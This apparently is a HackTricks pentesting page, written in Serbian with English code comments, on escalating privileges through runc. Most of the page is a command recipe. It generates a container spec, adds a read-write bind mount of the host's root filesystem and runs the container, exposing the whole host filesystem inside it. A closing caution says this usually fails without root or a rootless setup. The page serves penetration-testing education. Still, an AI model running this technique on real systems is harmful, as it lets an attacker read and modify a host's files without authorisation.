# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

Ako želite da saznate više o **runc**, pogledajte sledeću stranicu:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Ako otkrijete da je `runc` instaliran na hostu, možda ćete moći da **pokrenete kontejner montirajući root / folder hosta**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Ovo neće uvek raditi jer je podrazumevana operacija runc-a da se pokreće kao root, tako da njegovo pokretanje kao korisnika bez privilegija jednostavno ne može funkcionisati (osim ako nemate konfiguraciju bez root-a). Postavljanje konfiguracije bez root-a kao podrazumevane obično nije dobra ideja jer postoji prilično mnogo ograničenja unutar kontejnera bez root-a koja se ne primenjuju van kontejnera bez root-a.

{{#include ../../banners/hacktricks-training.md}}
